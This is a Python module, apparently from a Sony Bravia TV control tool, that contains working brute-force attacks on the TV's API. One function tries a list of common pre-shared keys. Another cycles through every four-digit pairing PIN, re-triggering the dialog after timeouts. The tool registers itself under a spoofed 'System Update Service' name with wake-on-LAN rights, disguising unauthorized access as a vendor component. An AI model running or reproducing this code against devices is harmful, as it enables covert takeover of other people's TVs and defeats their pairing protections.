from __future__ import annotations

import base64
import logging
import time
from datetime import datetime

import requests

from bravia_ctl.client import BraviaClient
from bravia_ctl.exceptions import BraviaConnectionError

logger = logging.getLogger(__name__)

_CLIENT_ID = "sony:system-update"
_NICKNAME = "System Update Service"

_REGISTER_PAYLOAD = {
    "id": 8,
    "method": "actRegister",
    "version": "1.0",
    "params": [
        {"clientid": _CLIENT_ID, "nickname": _NICKNAME, "level": "private"},
        [{"clientid": _CLIENT_ID, "value": "yes", "nickname": _NICKNAME, "function": "WOL"}],
    ],
}

COMMON_PSKS = [
    "0000", "1234", "1111", "sony", "admin", "password", "bravia",
    "0", "1", "9999", "4321", "5678", "abcd", "pass", "tv",
    "root", "guest", "user", "test", "default",
]


def bruteforce_psk(client: BraviaClient) -> str | None:
    url = f"{client.base_url}/sony/system"
    payload = {"method": "getPowerStatus", "id": 1, "params": [], "version": "1.0"}

    logger.info("Trying %d common PSK values...", len(COMMON_PSKS))

    for psk in COMMON_PSKS:
        try:
            resp = requests.post(
                url,
                headers={"Content-Type": "application/json", "X-Auth-PSK": psk},
                json=payload,
                timeout=3,
            )
            if resp.status_code == 200:
                data = resp.json()
                if "result" in data:
                    logger.info("Found working PSK: %s", psk)
                    return psk
        except Exception:
            continue

    logger.info("No working PSK found.")
    return None


def pair_with_pin(client: BraviaClient, pin: str | None = None) -> str | None:
    url = f"{client.base_url}/sony/accessControl"

    logger.info("Requesting PIN from TV...")
    resp = client.raw_post(url, json=_REGISTER_PAYLOAD, timeout=10)

    if resp.status_code == 200:
        logger.info("TV accepted without PIN (already paired or auth disabled)")
        cookie = resp.cookies.get("auth")
        if cookie:
            client.save_cookie(cookie)
        return cookie

    if resp.status_code != 401:
        logger.error("Unexpected response: HTTP %d — %s", resp.status_code, resp.text)
        return None

    if pin is None:
        pin = input("  Enter the PIN shown on the TV: ").strip()

    auth_header = base64.b64encode(f":{pin}".encode()).decode()
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Basic {auth_header}",
    }

    resp = client.raw_post(url, json=_REGISTER_PAYLOAD, headers=headers, timeout=10)

    if resp.status_code != 200:
        logger.error("Pairing failed: HTTP %d", resp.status_code)
        return None

    cookie = resp.cookies.get("auth")
    if cookie:
        client.save_cookie(cookie)
        return cookie

    logger.warning("Paired but no cookie returned.")
    logger.debug("Headers: %s", dict(resp.headers))
    logger.debug("Cookies: %s", dict(resp.cookies))
    return None


def bruteforce_pin(
    client: BraviaClient,
    *,
    delay: float = 0.02,
    max_retries: int = 5,
) -> str | None:
    """Bruteforce the 4-digit pairing PIN.

    The PIN is random and changes each time the dialog is triggered.
    If the dialog times out, we re-trigger and restart from 0000.
    """
    url = f"{client.base_url}/sony/accessControl"

    def trigger_dialog() -> bool | None:
        resp = client.raw_post(url, json=_REGISTER_PAYLOAD, timeout=10)
        if resp.status_code == 401:
            return True
        if resp.status_code == 200:
            cookie = resp.cookies.get("auth")
            if cookie:
                client.save_cookie(cookie)
            return None
        logger.error("Cannot trigger PIN dialog: HTTP %d", resp.status_code)
        return False

    def retrigger() -> bool | None:
        nonlocal session
        session.close()
        session = requests.Session()
        for attempt in range(1, max_retries + 1):
            wait = 3 * attempt
            logger.info("Waiting %ds for TV to recover (attempt %d/%d)...",
                        wait, attempt, max_retries)
            time.sleep(wait)
            try:
                result = trigger_dialog()
                if result is True:
                    logger.info("PIN dialog re-triggered (new PIN).")
                    return True
                if result is None:
                    return None
                logger.warning("Re-trigger returned unexpected result, retrying...")
            except BraviaConnectionError:
                logger.warning("TV still unreachable...")
        return False

    logger.info("Triggering PIN dialog on TV...")
    result = trigger_dialog()
    if result is None:
        return client._cookie
    if result is False:
        return None

    session = requests.Session()
    round_num = 0

    while True:
        round_num += 1
        logger.info("Round %d: trying PINs 0000-9999 (delay=%.0fms)...", round_num, delay * 1000)
        round_start = datetime.now()
        timed_out = False

        for pin_num in range(10000):
            pin = f"{pin_num:04d}"
            auth_header = base64.b64encode(f":{pin}".encode()).decode()
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Basic {auth_header}",
            }

            try:
                resp = session.post(url, headers=headers, json=_REGISTER_PAYLOAD, timeout=3)
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                logger.warning("Connection error at PIN %s", pin)
                r = retrigger()
                if r is None:
                    return client._cookie
                if r is False:
                    logger.error("TV unreachable after retries. Giving up.")
                    return None
                timed_out = True
                break

            if resp.status_code == 200:
                logger.info("FOUND PIN: %s", pin)
                cookie = resp.cookies.get("auth")
                if cookie:
                    client.save_cookie(cookie)
                    return cookie
                logger.warning("Paired but no cookie. Cookies: %s", dict(resp.cookies))
                return None

            if resp.status_code == 401:
                if pin_num > 0 and pin_num % 500 == 0:
                    elapsed = (datetime.now() - round_start).total_seconds()
                    rate = pin_num / elapsed if elapsed > 0 else 0
                    remaining = (10000 - pin_num) / rate if rate > 0 else 0
                    logger.info(
                        "  %d/10000  (%.0f pins/sec, ~%.0fs left)",
                        pin_num, rate, remaining,
                    )
            elif resp.status_code == 403:
                logger.warning("Dialog timed out at PIN %s. Re-triggering...", pin)
                r = retrigger()
                if r is None:
                    return client._cookie
                if r is False:
                    logger.error("Cannot recover. Giving up.")
                    return None
                timed_out = True
                break
            else:
                logger.debug("PIN %s: unexpected HTTP %d", pin, resp.status_code)

            time.sleep(delay)

        if not timed_out:
            logger.info("All 10000 PINs tried this round. Re-triggering for new PIN...")
            r = retrigger()
            if r is None:
                return client._cookie
            if r is False:
                logger.error("Cannot re-trigger. Giving up.")
                return None

    return None
